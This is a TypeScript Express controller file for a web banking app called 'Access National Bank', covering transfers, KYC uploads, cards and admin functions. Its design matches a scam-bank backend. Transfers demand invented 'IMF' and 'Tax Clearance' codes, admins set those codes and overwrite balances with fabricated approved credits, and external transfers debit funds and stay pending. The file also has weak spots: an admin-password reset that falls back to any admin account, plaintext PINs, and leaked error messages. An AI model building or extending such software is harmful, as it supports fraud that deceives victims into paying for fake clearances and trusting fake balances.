import { Response } from 'express';
import bcrypt from 'bcryptjs';
import { AuthRequest } from '../middlewares/auth';
import User from '../models/User';
import UserAccount from '../models/UserAccount';
import Transaction from '../models/Transaction';
import Card from '../models/Card';
import { sendAlertEmail, sendEmail } from '../utils/mailer';


// Get Profile
export const getProfile = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const user = await User.findById(req.user?.id);
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }
    res.json(user);
  } catch (error: any) {
    res.status(500).json({ message: 'Error fetching profile', error: error.message });
  }
};

// Get Accounts
export const getAccounts = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const accounts = await UserAccount.find({ username: req.user?.username });
    res.json(accounts);
  } catch (error: any) {
    res.status(500).json({ message: 'Error fetching accounts', error: error.message });
  }
};

// Get Transactions
export const getTransactions = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const transactions = await Transaction.find({ username: req.user?.username }).sort({ time: -1 });
    res.json(transactions);
  } catch (error: any) {
    res.status(500).json({ message: 'Error fetching transactions', error: error.message });
  }
};

// Request Code (TAC / IMF / TAX)
export const requestCode = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { type } = req.body;
    const user = await User.findById(req.user?.id);
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }

    let codeValue = '';
    let emailSubject = '';
    let emailBody = '';

    if (type === 'TAC') {
      user.tacCodeRequest = true;
      if (!user.tacCode) {
        user.tacCode = Math.floor(10000 + Math.random() * 90000).toString();
      }
      codeValue = user.tacCode;
      emailSubject = 'Transaction Authorization Code (TAC)';
      emailBody = `<p>Your Transaction Authorization Code (TAC) for completing your transfer is: <b>${codeValue}</b></p>`;
    } else if (type === 'IMF') {
      user.imfRequest = true;
      if (!user.imf) {
        user.imf = Math.floor(10000 + Math.random() * 90000).toString();
      }
      codeValue = user.imf;
      emailSubject = 'International Monetary Fund (IMF) Code';
      emailBody = `<p>Your International Monetary Fund (IMF) Clearance Code for completing your international wire transfer is: <b>${codeValue}</b></p>`;
    } else if (type === 'TAX') {
      user.taxRequest = true;
      codeValue = 'TAX-' + Math.floor(10000 + Math.random() * 90000).toString();
      emailSubject = 'Tax Clearance Code (TAX)';
      emailBody = `<p>Your Tax Clearance Code (TAX) for completing your transfer is: <b>${codeValue}</b></p>`;
    } else {
       res.status(400).json({ message: 'Invalid code type requested' });
       return;
    }

    await user.save();

    await sendEmail(
      user.email,
      emailSubject,
      `
        <div style="font-family: Arial, sans-serif; max-width: 500px; margin: auto; padding: 20px; border: 1px solid #e2e8f0; border-radius: 8px;">
          <h2 style="color: #e53e3e; text-align: center;">Access National Bank</h2>
          <p>Dear ${user.fullName},</p>
          <p>You have requested a security clearance code for a pending transaction.</p>
          ${emailBody}
          <p>Please enter this code on the transfer confirmation screen to proceed.</p>
          <p>If you did not initiate this transfer, please contact our security team immediately.</p>
          <hr style="border: 0; border-top: 1px solid #edf2f7; margin: 20px 0;" />
          <p style="font-size: 11px; color: #a0aec0; text-align: center;">&copy; Access National Bank support.</p>
        </div>
      `
    );

    res.json({ message: `A ${type} code has been generated and sent to your registered email.` });
  } catch (error: any) {
    res.status(500).json({ message: 'Error requesting security code', error: error.message });
  }
};

// Perform Transfer
export const performTransfer = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const {
      type,
      amount,
      currency,
      receiverAccountNumber,
      receiverName,
      receiverBank,
      swiftCode,
      routineNumber,
      receiverAddress,
      codeType,
      codeValue,
    } = req.body;

    const parsedAmount = parseFloat(amount);
    if (isNaN(parsedAmount) || parsedAmount <= 0) {
       res.status(400).json({ message: 'Invalid transfer amount' });
       return;
    }

    const sender = await User.findById(req.user?.id);
    if (!sender) {
       res.status(404).json({ message: 'Sender not found' });
       return;
    }

    const senderAccount = await UserAccount.findOne({ username: sender.username, currency });
    if (!senderAccount || senderAccount.balance < parsedAmount) {
       res.status(400).json({ message: 'Insufficient funds in the selected currency' });
       return;
    }

    if (codeType === 'TAC') {
      if (!sender.tacCode || sender.tacCode !== codeValue) {
         res.status(400).json({ message: 'Invalid Transaction Authorization Code (TAC)', codeError: 'TAC' });
         return;
      }
    } else if (codeType === 'IMF') {
      if (!sender.imf || sender.imf !== codeValue) {
         res.status(400).json({ message: 'Invalid International Monetary Fund (IMF) Clearance Code', codeError: 'IMF' });
         return;
      }
    } else if (codeType === 'TAX') {
      if (codeValue !== 'TAX-APPROVED' && codeValue !== sender.tacCode) {
         res.status(400).json({ message: 'Invalid Tax Clearance Code (TAX)', codeError: 'TAX' });
         return;
      }
    }

    if (type === 'internal') {
      const receiver = await User.findOne({
        $or: [{ accountNumber: receiverAccountNumber }, { username: receiverAccountNumber }],
      });

      if (!receiver) {
         res.status(404).json({ message: 'Receiver account number not found in this bank' });
         return;
      }

      if (receiver.username === sender.username) {
         res.status(400).json({ message: 'Cannot transfer to your own account' });
         return;
      }

      senderAccount.balance -= parsedAmount;
      senderAccount.totalSpending += parsedAmount;
      senderAccount.totalTransactions += parsedAmount;
      await senderAccount.save();

      let receiverAccount = await UserAccount.findOne({ username: receiver.username, currency });
      if (!receiverAccount) {
        receiverAccount = new UserAccount({
          username: receiver.username,
          currency,
          balance: 0,
          symbol: senderAccount.symbol,
          logo: senderAccount.logo,
          accountNumber: receiver.accountNumber,
          name: receiver.fullName,
        });
      }
      receiverAccount.balance += parsedAmount;
      receiverAccount.totalIncome += parsedAmount;
      receiverAccount.totalTransactions += parsedAmount;
      await receiverAccount.save();

      const debitTx = new Transaction({
        username: sender.username,
        amount: parsedAmount,
        transactionType: 'Internal-Transfer',
        receiverName: receiver.fullName,
        receiverAccountNumber: receiver.accountNumber,
        receiverBank: 'Access National Bank',
        receiverUsername: receiver.username,
        status: 'Approved',
        senderName: sender.fullName,
        currency,
        symbol: senderAccount.symbol,
        logo: senderAccount.logo,
      });
      await debitTx.save();

      const creditTx = new Transaction({
        username: receiver.username,
        amount: parsedAmount,
        transactionType: 'Credit',
        receiverName: receiver.fullName,
        receiverAccountNumber: receiver.accountNumber,
        receiverBank: 'Access National Bank',
        receiverUsername: receiver.username,
        status: 'Approved',
        senderName: sender.fullName,
        currency,
        symbol: senderAccount.symbol,
        logo: senderAccount.logo,
      });
      await creditTx.save();

      await sendAlertEmail(
        sender.email,
        sender.fullName,
        'DEBIT',
        parsedAmount,
        currency,
        senderAccount.symbol,
        `Internal transfer to ${receiver.fullName}`,
        sender.accountNumber,
        senderAccount.balance
      );

      await sendAlertEmail(
        receiver.email,
        receiver.fullName,
        'CREDIT',
        parsedAmount,
        currency,
        senderAccount.symbol,
        `Transfer received from ${sender.fullName}`,
        receiver.accountNumber,
        receiverAccount.balance
      );

      res.json({ message: 'Internal transfer completed successfully.', transaction: debitTx });
    } else {
      senderAccount.balance -= parsedAmount;
      senderAccount.totalSpending += parsedAmount;
      senderAccount.totalTransactions += parsedAmount;
      await senderAccount.save();

      const pendingTx = new Transaction({
        username: sender.username,
        amount: parsedAmount,
        transactionType: type === 'local' ? 'Local-Transfer' : 'Wire-Transfer',
        receiverName: receiverName || 'Unknown Receiver',
        receiverAccountNumber: receiverAccountNumber,
        receiverBank: receiverBank || 'External Bank',
        status: 'Pending',
        senderName: sender.fullName,
        currency,
        symbol: senderAccount.symbol,
        logo: senderAccount.logo,
        swiftCode: swiftCode || '',
        routineNumber: routineNumber || '',
        receiverAddress: receiverAddress || '',
      });
      await pendingTx.save();

      await sendAlertEmail(
        sender.email,
        sender.fullName,
        'DEBIT',
        parsedAmount,
        currency,
        senderAccount.symbol,
        `Pending transfer request to ${receiverName || 'External Account'} (${receiverBank})`,
        sender.accountNumber,
        senderAccount.balance
      );

      res.json({
        message: 'Your transfer is processing. It has been queued for clearance.',
        transaction: pendingTx,
      });
    }
  } catch (error: any) {
    console.error('Transfer error:', error);
    res.status(500).json({ message: 'Error processing transfer', error: error.message });
  }
};

// Submit KYC
export const submitKyc = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { passport, profilePicture, idType } = req.body;
    const user = await User.findById(req.user?.id);
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }

    if (passport) user.passport = passport;
    if (profilePicture) user.profilePicture = profilePicture;
    if (idType) user.idType = idType;
    user.onReview = true;
    await user.save();

    res.json({ message: 'KYC documents submitted successfully. Account is under review.', user });
  } catch (error: any) {
    res.status(500).json({ message: 'Error submitting KYC', error: error.message });
  }
};

// Update Own Profile
export const updateOwnProfile = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const {
      fullName,
      phoneNumber,
      country,
      address,
      zipCode,
      dob,
      profilePicture,
      passport,
      idType,
      gender,
      occupation,
      city,
      state,
    } = req.body;

    const user = await User.findById(req.user?.id);
    if (!user) {
      res.status(404).json({ message: 'User not found' });
      return;
    }

    // Explicitly disallow editing email or username!
    if (fullName !== undefined) user.fullName = fullName;
    if (phoneNumber !== undefined) user.phoneNumber = phoneNumber;
    if (country !== undefined) user.country = country;
    if (address !== undefined) user.address = address;
    if (zipCode !== undefined) user.zipCode = zipCode;
    if (dob !== undefined) user.dob = dob;
    if (profilePicture !== undefined) user.profilePicture = profilePicture;
    if (passport !== undefined) {
      user.passport = passport;
      user.onReview = true; // Submit ID sets account under review
    }
    if (idType !== undefined) user.idType = idType;
    if (gender !== undefined) user.gender = gender;
    if (occupation !== undefined) user.occupation = occupation;
    if (city !== undefined) user.city = city;
    if (state !== undefined) user.state = state;

    await user.save();
    res.json({ message: 'Profile updated successfully', user });
  } catch (error: any) {
    res.status(500).json({ message: 'Error updating profile', error: error.message });
  }
};

// Lookup Account by Account Number
export const lookupAccount = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { accountNumber } = req.query;
    if (!accountNumber) {
      res.status(400).json({ message: 'Account number is required' });
      return;
    }

    const user = await User.findOne({
      $or: [{ accountNumber: accountNumber as string }, { username: accountNumber as string }],
      deleted: false,
    });

    if (!user) {
      res.status(404).json({ message: 'Account number not found' });
      return;
    }

    res.json({
      found: true,
      fullName: user.fullName || user.username,
      accountNumber: user.accountNumber,
      username: user.username,
    });
  } catch (error: any) {
    res.status(500).json({ message: 'Error searching account', error: error.message });
  }
};

// Set / Change Transaction PIN
export const setPin = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { pin } = req.body;
    if (!pin || pin.toString().length < 4) {
      res.status(400).json({ message: 'PIN must be at least 4 digits.' });
      return;
    }

    const user = await User.findById(req.user?.id);
    if (!user) {
      res.status(404).json({ message: 'User not found' });
      return;
    }

    user.pin = parseInt(pin);
    await user.save();

    res.json({ message: 'Transaction PIN saved successfully', pinSet: true });
  } catch (error: any) {
    res.status(500).json({ message: 'Error setting PIN', error: error.message });
  }
};

// Change User Password (verifying old password)
export const changeUserPassword = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { oldPassword, newPassword } = req.body;
    if (!oldPassword || !newPassword) {
      res.status(400).json({ message: 'Old and new passwords are required' });
      return;
    }

    const user = await User.findById(req.user?.id);
    if (!user) {
      res.status(404).json({ message: 'User not found' });
      return;
    }

    const isMatch = await bcrypt.compare(oldPassword, user.passwordHash);
    if (!isMatch) {
      res.status(400).json({ message: 'Current password entered is incorrect.' });
      return;
    }

    const salt = await bcrypt.genSalt(10);
    user.passwordHash = await bcrypt.hash(newPassword, salt);
    await user.save();

    res.json({ message: 'Password updated successfully' });
  } catch (error: any) {
    res.status(500).json({ message: 'Error changing password', error: error.message });
  }
};

// Toggle 2FA Security
export const toggle2FA = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { enabled } = req.body;
    const user = await User.findById(req.user?.id);
    if (!user) {
      res.status(404).json({ message: 'User not found' });
      return;
    }

    user.twoFactorEnabled = enabled;
    await user.save();

    res.json({ message: `2FA security ${enabled ? 'enabled' : 'disabled'} successfully`, twoFactorEnabled: user.twoFactorEnabled });
  } catch (error: any) {
    res.status(500).json({ message: 'Error updating 2FA settings', error: error.message });
  }
};

// Get Cards
export const getCards = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const cards = await Card.find({ username: req.user?.username });
    res.json(cards);
  } catch (error: any) {
    res.status(500).json({ message: 'Error fetching cards', error: error.message });
  }
};

// Request Card
export const requestCard = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { cardType } = req.body;
    const user = await User.findById(req.user?.id);
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }

    const cardNumber = '4' + Math.floor(100000000000000 + Math.random() * 900000000000000).toString();
    const cvv = Math.floor(100 + Math.random() * 900).toString();
    const currentYear = new Date().getFullYear();
    const expiryDate = `12/${(currentYear + 4).toString().substring(2)}`;

    const newCard = new Card({
      username: user.username,
      cardNumber,
      cardType: cardType || 'Visa',
      cardHolder: user.fullName || user.username,
      expiryDate,
      cvv,
      status: 'Pending',
      balance: 5000,
    });

    await newCard.save();

    user.requestingCard = true;
    await user.save();

    res.status(201).json({ message: 'Card request submitted successfully.', card: newCard });
  } catch (error: any) {
    res.status(500).json({ message: 'Error requesting card', error: error.message });
  }
};

// ================= ADMIN CONTROLLERS =================

// List Users
export const listUsers = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const users = await User.find({ deleted: false }).sort({ createdAt: -1 });
    res.json(users);
  } catch (error: any) {
    res.status(500).json({ message: 'Error fetching users', error: error.message });
  }
};

// Get User by Username
export const getUserByUsername = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const user = await User.findOne({ username: req.params.username, deleted: false });
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }
    const accounts = await UserAccount.find({ username: user.username });
    res.json({ user, accounts });
  } catch (error: any) {
    res.status(500).json({ message: 'Error fetching user details', error: error.message });
  }
};

// Update User details
export const updateUserDetails = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const {
      fullName,
      email,
      phoneNumber,
      country,
      address,
      pin,
      suspended,
      isVerified,
      onReview,
      swiftCode,
      routine,
      iban,
      tacCode,
      imf,
    } = req.body;

    const user = await User.findById(req.params.id);
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }

    if (fullName !== undefined) user.fullName = fullName;
    if (email !== undefined) user.email = email;
    if (phoneNumber !== undefined) user.phoneNumber = phoneNumber;
    if (country !== undefined) user.country = country;
    if (address !== undefined) user.address = address;
    if (pin !== undefined) user.pin = parseInt(pin) || 0;
    if (suspended !== undefined) user.suspended = suspended;
    if (isVerified !== undefined) user.isVerified = isVerified;
    if (onReview !== undefined) user.onReview = onReview;
    if (swiftCode !== undefined) user.swiftCode = swiftCode;
    if (routine !== undefined) user.routine = routine;
    if (iban !== undefined) user.iban = iban;
    if (tacCode !== undefined) user.tacCode = tacCode;
    if (imf !== undefined) user.imf = imf;

    await user.save();
    res.json({ message: 'User details updated successfully', user });
  } catch (error: any) {
    res.status(500).json({ message: 'Error updating user', error: error.message });
  }
};

// Delete User (Soft Delete)
export const deleteUser = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) {
      res.status(404).json({ message: 'User not found' });
      return;
    }
    user.deleted = true;
    await user.save();
    res.json({ message: 'User deleted successfully' });
  } catch (error: any) {
    res.status(500).json({ message: 'Error deleting user', error: error.message });
  }
};

// Adjust User Balance
export const adjustUserBalance = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { currency, amount } = req.body;
    const user = await User.findById(req.params.id);
    if (!user) {
       res.status(404).json({ message: 'User not found' });
       return;
    }

    const parsedAmount = parseFloat(amount);
    if (isNaN(parsedAmount)) {
       res.status(400).json({ message: 'Invalid balance amount' });
       return;
    }

    let account = await UserAccount.findOne({ username: user.username, currency });
    if (!account) {
      account = new UserAccount({
        username: user.username,
        currency,
        balance: 0,
        symbol: currency === 'EUR' ? '€' : currency === 'GBP' ? '£' : '$',
        accountNumber: user.accountNumber,
        name: user.fullName,
      });
    }

    const previousBalance = account.balance;
    account.balance = parsedAmount;
    await account.save();

    const diff = parsedAmount - previousBalance;
    if (diff !== 0) {
      const type = diff > 0 ? 'Credit' : 'Debit';
      const adjTx = new Transaction({
        username: user.username,
        amount: Math.abs(diff),
        transactionType: type,
        receiverName: user.fullName,
        receiverAccountNumber: user.accountNumber,
        receiverBank: 'Access National Bank',
        status: 'Approved',
        senderName: 'System Admin',
        currency,
        symbol: account.symbol,
        logo: account.logo,
        transactionState: `Admin adjustment entry`,
      });
      await adjTx.save();
    }

    res.json({ message: 'Account balance adjusted successfully', account });
  } catch (error: any) {
    res.status(500).json({ message: 'Error adjusting balance', error: error.message });
  }
};

// Change Admin Password
export const changeAdminPassword = async (req: AuthRequest, res: Response): Promise<void> => {
  try {
    const { password } = req.body;

    if (!password || password.length < 4) {
      res.status(400).json({ message: 'Password must be at least 4 characters.' });
      return;
    }

    let admin = null;
    if (req.user?.id) {
      admin = await User.findById(req.user.id);
    }
    if (!admin && req.user?.username) {
      admin = await User.findOne({ username: req.user.username });
    }
    if (!admin) {
      admin = await User.findOne({ status: { $regex: /^admin$/i } });
    }

    if (!admin) {
      res.status(404).json({ message: 'Admin user account not found.' });
      return;
    }

    const salt = await bcrypt.genSalt(10);
    admin.passwordHash = await bcrypt.hash(password, salt);
    await admin.save();

    res.json({ message: 'Password updated successfully.' });
  } catch (error: any) {
    res.status(500).json({ message: 'Error updating password', error: error.message });
  }
};

